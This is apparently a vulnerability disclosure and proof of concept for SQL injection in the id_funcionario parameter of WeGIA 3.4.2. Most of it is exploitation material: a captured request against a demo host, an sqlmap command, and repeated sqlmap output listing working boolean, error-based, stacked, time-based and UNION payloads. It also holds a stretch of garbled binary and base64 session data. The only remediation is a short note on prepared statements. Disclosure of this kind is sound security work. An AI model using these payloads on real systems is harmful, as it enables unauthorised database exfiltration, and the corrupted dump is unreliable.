VIDEO POC: https://youtu.be/W648Rq4_DnE

Vulnerability Type: SQL Injection (Union-based / Error-based exfiltration)

#Affected Application: WeGIA version 3.4.2

#Vulnerable Endpoint: /html/funcionario/profile_funcionario.php?id_funcionario={ID}

#Vulnerable Parameter: id_funcionario (expected to be numeric, but unsafely concatenated into the query)

#Impact: Full exfiltration of database content (database names, tables, columns, sensitive records). Severe confidentiality breach and potential total data compromise.

🔧 PoC Step-by-Step

1 - Authentication:
Log into the WeGIA 3.4.2 platform with valid credentials (e.g., administrator account).

![image](https://github.com/user-attachments/assets/330d5f02-c10d-45c5-b541-b0d9cacbb4ed)

2 - Prepare a Test Record:
If necessary, register a new employee to obtain a controlled id_funcionario.

![image](https://github.com/user-attachments/assets/498ed9b6-b393-4c8c-9648-043c8054a348)

![image](https://github.com/user-attachments/assets/ce0a6536-5963-4b56-829c-1669f36712f2)

3 - Intercept and Save the Request:

![image](https://github.com/user-attachments/assets/035286ba-ea6f-4517-9b1d-ee7d1d861914)

4 - Access the employee profile page for a given ID, for example:

![image](https://github.com/user-attachments/assets/0dd122c3-d42d-40a8-a6db-e01cbc428805)

GET /html/funcionario/profile_funcionario.php?id_funcionario=2 HTTP/2  
Host: demo.wegia.org  
Cookie: _ga=GA1.1.620166737.1749629529; PHPSESSID=elbvoreo9ua2cs8812amnokbdc; _ga_F8DXBXLV8J=GS2.1.s1750752029$o5$g1$t1750752048$j41$l0$h0  
Accept-Language: pt-BR,pt;q=0.9  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Sec-Fetch-Site: same-origin  
Sec-Fetch-Mode: navigate  
Sec-Fetch-Dest: document  
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"  
Sec-Ch-Ua-Mobile: ?0  
Sec-Ch-Ua-Platform: "Windows"  
Referer: https://demo.wegia.org/html/funcionario/informacao_funcionario.php  
Accept-Encoding: gzip, deflate, br  
Priority: u=0, i  

Use a proxy tool (Burp Suite, OWASP ZAP, etc.) to intercept and save this request in a file, e.g., request.txt.

5 - Run sqlmap with the Saved Request:

![image](https://github.com/user-attachments/assets/2494d08b-f54d-4f82-9562-4e65010cf5c7)

Execute sqlmap pointing to the saved file, testing injection and enumerating databases:

#sqlmap -r request.txt --batch --dbs

Sqlmap identifies the injection point in id_funcionario and confirms that the database is MySQL/MariaDB.

6 - After processing, sqlmap or manual analysis reveals existing databases, such as information_schema and wegia.

![image](https://github.com/user-attachments/assets/34720bfa-070c-4afc-b3ca-10f6997a5769)
![image](https://github.com/user-attachments/assets/ae20df66-b567-4af2-9b38-d0b184d18b00)


EXTRA FOR INVESTIGATION:

sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
---
Parameter: id_funcionario (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id_funcionario=(SELECT (CASE WHEN (6735=6735) THEN 2 ELSE (SELECT 1907 UNION SELECT 5920) END))
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id_funcionario=2 AND (SELECT 2361 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(2361=2361,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id_funcionario=2;SELECT SLEEP(5)#
    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id_funcionario=2 AND (SELECT 6871 FROM (SELECT(SLEEP(5)))hXwh)
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id_funcionario=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b786271,0x6966704e4c465548474363426450456467694449586e7569486f6c62635653586264435949714462,0x717a716271),NULL,NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL-- -
---
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id_funcionario (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id_funcionario=(SELECT (CASE WHEN (6735=6735) THEN 2 ELSE (SELECT 1907 UNION SELECT 5920) END))
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id_funcionario=2 AND (SELECT 2361 FROM(SELECT COUNT(*),CONCAT(0x716b786271,(SELECT (ELT(2361=2361,1))),0x717a716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id_funcionario=2;SELECT SLEEP(5)#
    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id_funcionario=2 AND (SELECT 6871 FROM (SELECT(SLEEP(5)))hXwh)
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: id_funcionario=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b786271,0x6966704e4c465548474363426450456467694449586e7569486f6c62635653586264435949714462,0x717a716271),NULL,NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL-- -
---
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
available databases [2]:
[*] information_schema
[*] wegia

�.������jcqkxbqinformation_schemaqzqbqqkxbqwegiaqzqbq����ȹ�Ǆ#qkxbq1qzqbq�L�������gAJdcQBjbGliLmNvcmUuZGF0YXR5cGUKSW5qZWN0aW9uRGljdApxASmBcQIoWAUAAABwbGFjZXEDWAMAAABHRVRxBFgJAAAAcGFyYW1ldGVycQVYDgAAAGlkX2Z1bmNpb25hcmlvcQZYBQAAAHB0eXBlcQdLAVgGAAAAcHJlZml4cQhYAAAAAHEJWAYAAABzdWZmaXhxCmgJWAYAAABjbGF1c2VxC11xDChLAUsCSwNlWAUAAABub3Rlc3ENXXEOWAQAAABkYXRhcQ9jbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxECmBcREoSwFoECmBcRIoWAUAAAB0aXRsZXETWDgAAABCb29sZWFuLWJhc2VkIGJsaW5kIC0gUGFyYW1ldGVyIHJlcGxhY2UgKG9yaWdpbmFsIHZhbHVlKXEUWAcAAABwYXlsb2FkcRVYXwAAAGlkX2Z1bmNpb25hcmlvPShTRUxFQ1QgKENBU0UgV0hFTiAoNjczNT02NzM1KSBUSEVOIDIgRUxTRSAoU0VMRUNUIDE5MDcgVU5JT04gU0VMRUNUIDU5MjApIEVORCkpcRZYBQAAAHdoZXJlcRdLA1gGAAAAdmVjdG9ycRhYaAAAAChTRUxFQ1QgKENBU0UgV0hFTiAoW0lORkVSRU5DRV0pIFRIRU4gW09SSUdWQUxVRV0gRUxTRSAoU0VMRUNUIFtSQU5ETlVNMV0gVU5JT04gU0VMRUNUIFtSQU5ETlVNMl0pIEVORCkpcRlYBwAAAGNvbW1lbnRxGmgJWA8AAAB0ZW1wbGF0ZVBheWxvYWRxG05YCgAAAG1hdGNoUmF0aW9xHEc/YGJN0vGp/FgIAAAAdHJ1ZUNvZGVxHU0uAVgJAAAAZmFsc2VDb2RlcR5NLgF1fXEfKFgJAAAAYXR0cmlidXRlcSBOWAgAAABrZXljaGVja3EhiFgYAAAAX0F0dHJpYkRpY3RfX2luaXRpYWxpc2VkcSKIdWJLAmgQKYFxIyhoE1hRAAAATXlTUUwgPj0gNS4wIEFORCBlcnJvci1iYXNlZCAtIFdIRVJFLCBIQVZJTkcsIE9SREVSIEJZIG9yIEdST1VQIEJZIGNsYXVzZSAoRkxPT1IpcSRoFVi0AAAAaWRfZnVuY2lvbmFyaW89MiBBTkQgKFNFTEVDVCAyMzYxIEZST00oU0VMRUNUIENPVU5UKCopLENPTkNBVCgweDcxNmI3ODYyNzEsKFNFTEVDVCAoRUxUKDIzNjE9MjM2MSwxKSkpLDB4NzE3YTcxNjI3MSxGTE9PUihSQU5EKDApKjIpKXggRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuUExVR0lOUyBHUk9VUCBCWSB4KWEpcSVoF0sBaBhYowAAAEFORCAoU0VMRUNUIFtSQU5ETlVNXSBGUk9NKFNFTEVDVCBDT1VOVCgqKSxDT05DQVQoJ1tERUxJTUlURVJfU1RBUlRdJywoW1FVRVJZXSksJ1tERUxJTUlURVJfU1RPUF0nLEZMT09SKFJBTkQoMCkqMikpeCBGUk9NIElORk9STUFUSU9OX1NDSEVNQS5QTFVHSU5TIEdST1VQIEJZIHgpYSlxJmgaaAloG05oHEc/YGJN0vGp/GgdTmgeTnV9cScoaCBOaCGIaCKIdWJLBGgQKYFxKChoE1gpAAAATXlTUUwgPj0gNS4wLjEyIHN0YWNrZWQgcXVlcmllcyAoY29tbWVudClxKWgVWCsAAABpZF9mdW5jaW9uYXJpbz0yO1NFTEVDVCBTTEVFUChbU0xFRVBUSU1FXSkjcSpoF0sBaBhYNgAAADtTRUxFQ1QgSUYoKFtJTkZFUkVOQ0VdKSxTTEVFUChbU0xFRVBUSU1FXSksW1JBTkROVU1dKXEraBpYAQAAACNxLGgbTmgcRz9gYk3S8an8aB1NkAFoHk51fXEtKGggTmghiGgiiHViSwVoECmBcS4oaBNYMgAAAE15U1FMID49IDUuMC4xMiBBTkQgdGltZS1iYXNlZCBibGluZCAocXVlcnkgU0xFRVApcS9oFVhIAAAAaWRfZnVuY2lvbmFyaW89MiBBTkQgKFNFTEVDVCA2ODcxIEZST00gKFNFTEVDVChTTEVFUChbU0xFRVBUSU1FXSkpKWhYd2gpcTBoF0sBaBhYYQAAAEFORCAoU0VMRUNUIFtSQU5ETlVNXSBGUk9NIChTRUxFQ1QoU0xFRVAoW1NMRUVQVElNRV0tKElGKFtJTkZFUkVOQ0VdLDAsW1NMRUVQVElNRV0pKSkpKVtSQU5EU1RSXSlxMWgaaAloG05oHEc/YGJN0vGp/GgdTS4BaB5OdX1xMihoIE5oIYhoIoh1YksGaBApgXEzKGgTWCwAAABHZW5lcmljIFVOSU9OIHF1ZXJ5IChOVUxMKSAtIDEgdG8gMjAgY29sdW1uc3E0aBVYxwAAAGlkX2Z1bmNpb25hcmlvPTIgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDT05DQVQoMHg3MTZiNzg2MjcxLDB4Njk2NjcwNGU0YzQ2NTU0ODQ3NDM2MzQyNjQ1MDQ1NjQ2NzY5NDQ0OTU4NmU3NTY5NDg2ZjZjNjI2MzU2NTM1ODYyNjQ0MzU5NDk3MTQ0NjIsMHg3MTdhNzE2MjcxKSxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTC0tIC1xNWgXSwFoGChLA0sKWBUAAABbR0VORVJJQ19TUUxfQ09NTUVOVF1xNmgJaAlYBAAAAE5VTExxN0sBiYhOTnRxOGgaaDZoG05oHEc/YGJN0vGp/GgdTmgeTnV9cTkoaCBOaCGIaCKIdWJ1fXE6KFgJAAAAYXR0cmlidXRlcTtOWAgAAABrZXljaGVja3E8iFgYAAAAX0F0dHJpYkRpY3RfX2luaXRpYWxpc2VkcT2IdWJYBAAAAGNvbmZxPmgQKYFxPyhYCAAAAHRleHRPbmx5cUBOWAYAAAB0aXRsZXNxQU5YBAAAAGNvZGVxQk5YBgAAAHN0cmluZ3FDTlgJAAAAbm90U3RyaW5ncUROWAYAAAByZWdleHBxRU5YCAAAAG9wdGySQL 5cUZOdX1xRyhoO05oPIhoPYh1YlgEAAAAZGJtc3FIWAUAAABNeVNRTHFJWAwAAABkYm1zX3ZlcnNpb25xSl1xS1gGAAAAPj0gNS4wcUxhWAIAAABvc3FNTnV9cU4oaDtOaDyIaD2IdWJhLg==�1
�����Œ@      �����ֲ�gAJdcQAu�t��������j�mgAJjbGliLmNvcmUuZGF0YXR5cGUKQXR0cmliRGljdApxACmBcQEoWAkAAABkZWxpbWl0ZXJxAlgGAAAAY2ptdmdvcQNYBQAAAHN0YXJ0cQRYBQAAAHFreGJxcQVYBAAAAHN0b3BxBlgFAAAAcXpxYnFxB1gCAAAAYXRxCFgDAAAAcWpxcQlYBQAAAHNwYWNlcQpYAwAAAHFwcXELWAYAAABkb2xsYXJxDFgDAAAAcWRxcQ1YBQAAAGhhc2hfcQ5YAwAAAHFucXEPdX1xEChYCQAAAGF0dHJpYnV0ZXERTlgIAAAAa2V5Y2hlY2txEohYGAAAAF9BdHRyaWJEw�����w��������U#qkxbq1qzqbq�����ؾ��#qkxbq1qzqbq��������T#qkxbq1qzqbq������㢁#qkxbq1qzqbqdy9odG1sL2h0bWwvZnVuY2lvbmFyaW8vcHJvZmlsZV9mdW5jaW9uYXJpby5waHBxAmGFcQNScQQu-
      ariaDBhttp://demo.wegia.org:80/html/funcionario/profile_funcionario.php?id_funcionario=2 (GET)  # /usr/bin/sqlmap -r request.txt -p id_funcionario --threads=10 --level=1 --risk=1 --b


##### EXTRA 2:
![image](https://github.com/user-attachments/assets/a89ffa69-f721-417a-8d6f-5ec83e454c26)

⚠️ Recommendations & Mitigations

Prepared Statements / Parameterized Queries:
Always use bound parameters for id_funcionario instead of directly concatenating it into SQL.
